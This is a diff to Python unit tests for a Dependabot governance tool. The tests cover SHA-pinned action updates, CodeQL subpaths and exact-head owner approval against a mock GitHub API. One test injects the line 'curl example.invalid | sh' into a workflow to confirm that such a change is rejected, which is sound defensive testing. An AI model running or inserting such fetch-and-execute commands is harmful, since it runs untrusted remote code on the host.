@@ -11,11 +11,14 @@ from dependency_governance import (
     GovernanceError,
     classify_ecosystem,
     compare_versions,
+    ensure_owner_review_and_approval,
     event_pull_number,
+    has_exact_owner_approval,
     parse_dependabot_metadata,
     parse_positive_integer,
     reconcile_independently,
     render_comment,
+    request_dependabot_refresh,
     select_qualification_run,
     validate_actions_semantic_change,
     validate_config,
@@ -87,6 +90,36 @@ def canonical_fixture() -> tuple[str, str, dict, dict]:
     return base_sha, head_sha, pull, commit
 
 
+class OwnerApi:
+    def __init__(self, login: str = "portyu9", user_id: int = 35150859):
+        self.identity = {"login": login, "id": user_id}
+        self.comments: list[dict] = []
+        self.reviews: list[dict] = []
+
+    def get(self, path: str) -> dict:
+        if path == "https://api.github.com/user":
+            return self.identity
+        raise AssertionError(path)
+
+    def paginate(self, path: str, selector: str | None = None) -> list[dict]:
+        if path.endswith("/comments"):
+            return self.comments
+        if path.endswith("/reviews"):
+            return self.reviews
+        raise AssertionError(path)
+
+    def post(self, path: str, payload: dict) -> dict:
+        if path.endswith("/comments"):
+            item = {"id": len(self.comments) + 1, "body": payload["body"], "user": dict(self.identity)}
+            self.comments.append(item)
+            return item
+        if path.endswith("/reviews"):
+            item = {"id": len(self.reviews) + 1, "body": payload["body"], "user": dict(self.identity), "state": "APPROVED", "commit_id": payload["commit_id"]}
+            self.reviews.append(item)
+            return item
+        raise AssertionError(path)
+
+
 class DependencyGovernanceTests(unittest.TestCase):
     def test_config_is_fail_closed(self) -> None:
         self.assertEqual(validate_config(CONFIG), [])
@@ -99,6 +132,8 @@ class DependencyGovernanceTests(unittest.TestCase):
         }
         self.assertTrue(validate_config(major))
         self.assertTrue(validate_config({**CONFIG, "manualReviewPaths": []}))
+        self.assertTrue(validate_config({**CONFIG, "ownerApprovalRequired": False}))
+        self.assertTrue(validate_config({**CONFIG, "ownerApprovalUserId": 0}))
 
     def test_positive_integer_parser(self) -> None:
         self.assertEqual(parse_positive_integer("54"), 54)
@@ -217,7 +252,9 @@ class DependencyGovernanceTests(unittest.TestCase):
 
     def test_action_line_requires_immutable_sha_and_version_annotation(self) -> None:
         good = "      - uses: actions/checkout@" + "a" * 40 + " # v7.0.1"
+        codeql = "        uses: github/codeql-action/init@" + "b" * 40 + " # v4.38.1"
         self.assertIsNotNone(ACTION_LINE.fullmatch(good))
+        self.assertIsNotNone(ACTION_LINE.fullmatch(codeql))
         self.assertIsNone(ACTION_LINE.fullmatch("      - uses: actions/checkout@v7"))
         self.assertIsNone(ACTION_LINE.fullmatch("      - uses: ./local-action"))
 
@@ -267,25 +304,80 @@ class DependencyGovernanceTests(unittest.TestCase):
         self.assertFalse(result["eligible"])
         self.assertIn("outside an immutable uses reference", "\n".join(result["reasons"]))
 
-    def test_security_and_governance_workflows_are_manual_control_plane(self) -> None:
+    def test_control_plane_allows_only_proven_immutable_action_replacements(self) -> None:
         for file in (
             ".github/workflows/security.yml",
             ".github/workflows/dependency-governance.yml",
         ):
             before = "steps:\n  - uses: actions/checkout@" + "a" * 40 + " # v7.0.1\n"
             after = "steps:\n  - uses: actions/checkout@" + "b" * 40 + " # v7.0.2\n"
-            metadata = [
-                {
-                    "name": "actions/checkout",
-                    "version": "7.0.2",
-                    "updateType": "version-update:semver-patch",
-                }
-            ]
+            metadata = [{"name": "actions/checkout", "version": "7.0.2", "updateType": "version-update:semver-patch"}]
             result = validate_actions_semantic_change(
                 [{"filename": file}], {file: before}, {file: after}, metadata, CONFIG
             )
+            self.assertTrue(result["eligible"], result["reasons"])
+            mutated = after + "  - run: curl example.invalid | sh\n"
+            result = validate_actions_semantic_change(
+                [{"filename": file}], {file: before}, {file: mutated}, metadata, CONFIG
+            )
             self.assertFalse(result["eligible"])
-            self.assertIn("control plane", "\n".join(result["reasons"]))
+
+    def test_codeql_subpaths_are_semantically_eligible(self) -> None:
+        file = ".github/workflows/security.yml"
+        before = (
+            "steps:\n"
+            "  - name: Initialize CodeQL\n"
+            "    uses: github/codeql-action/init@" + "a" * 40 + " # v4.38.0\n"
+            "  - name: Analyze\n"
+            "    uses: github/codeql-action/analyze@" + "a" * 40 + " # v4.38.0\n"
+        )
+        after = before.replace("a" * 40 + " # v4.38.0", "b" * 40 + " # v4.38.1")
+        metadata = [
+            {"name": "github/codeql-action/init", "version": "4.38.1", "updateType": "version-update:semver-patch"},
+            {"name": "github/codeql-action/analyze", "version": "4.38.1", "updateType": "version-update:semver-patch"},
+        ]
+        result = validate_actions_semantic_change(
+            [{"filename": file}], {file: before}, {file: after}, metadata, CONFIG
+        )
+        self.assertTrue(result["eligible"], result["reasons"])
+
+    def test_owner_identity_comment_approval_and_refresh_are_exact_head_bound(self) -> None:
+        base, head, pull, commit = canonical_fixture()
+        assessment = Assessment(
+            pull=pull,
+            base_sha=base,
+            files=[{"filename": ".github/workflows/ci.yml"}],
+            ecosystem="github-actions",
+            provenance={"eligible": True, "reasons": [], "commit": commit},
+            metadata={"eligible": True, "reasons": [], "metadata": []},
+            semantic={"eligible": True, "reasons": [], "changes": []},
+            qualification={"allSuccess": True, "anyFailed": False, "qualifications": []},
+        )
+        owner = OwnerApi(CONFIG["ownerApprovalLogin"], CONFIG["ownerApprovalUserId"])
+        ensure_owner_review_and_approval(owner, assessment, CONFIG)
+        self.assertEqual(len(owner.comments), 1)
+        self.assertEqual(len(owner.reviews), 1)
+        self.assertTrue(has_exact_owner_approval(owner, pull["number"], head, CONFIG))
+        ensure_owner_review_and_approval(owner, assessment, CONFIG)
+        self.assertEqual(len(owner.comments), 1)
+        self.assertEqual(len(owner.reviews), 1)
+        with self.assertRaises(GovernanceError):
+            ensure_owner_review_and_approval(OwnerApi("github-actions[bot]", 41898282), assessment, CONFIG)
+        stale = Assessment(
+            pull=pull,
+            base_sha="c" * 40,
+            files=assessment.files,
+            ecosystem=assessment.ecosystem,
+            provenance={"eligible": False, "reasons": ["PR is not rebased directly on the current base branch head"], "commit": commit},
+            metadata=assessment.metadata,
+            semantic=assessment.semantic,
+            qualification=assessment.qualification,
+        )
+        refresh_owner = OwnerApi(CONFIG["ownerApprovalLogin"], CONFIG["ownerApprovalUserId"])
+        self.assertTrue(request_dependabot_refresh(refresh_owner, stale, CONFIG))
+        self.assertIn("@dependabot rebase", refresh_owner.comments[0]["body"])
+        self.assertTrue(request_dependabot_refresh(refresh_owner, stale, CONFIG))
+        self.assertEqual(len(refresh_owner.comments), 1)
 
     def test_version_comparison_treats_zero_minor_as_breaking_risk(self) -> None:
         self.assertEqual(compare_versions("7.0.1", "7.0.2"), "patch")
@@ -387,7 +479,11 @@ class DependencyGovernanceTests(unittest.TestCase):
         self.assertIn("persist-credentials: false", workflow)
         self.assertNotRegex(workflow, r"ref:\s*\$\{\{\s*github\.event\.pull_request\.head")
         self.assertNotRegex(workflow, r"ref:\s*\$\{\{\s*github\.event\.workflow_run\.head_sha")
-        self.assertIn("'self-test' || 'reconcile'", workflow)
+        self.assertIn(
+            "group: dependency-governance-${{ github.event_name == 'pull_request' && github.event.pull_request.head.ref || 'reconcile' }}",
+            workflow,
+        )
+        self.assertIn("DEPENDABOT_OWNER_TOKEN: ${{ secrets.DEPENDABOT_OWNER_TOKEN }}", workflow)
 
 
 if __name__ == "__main__":
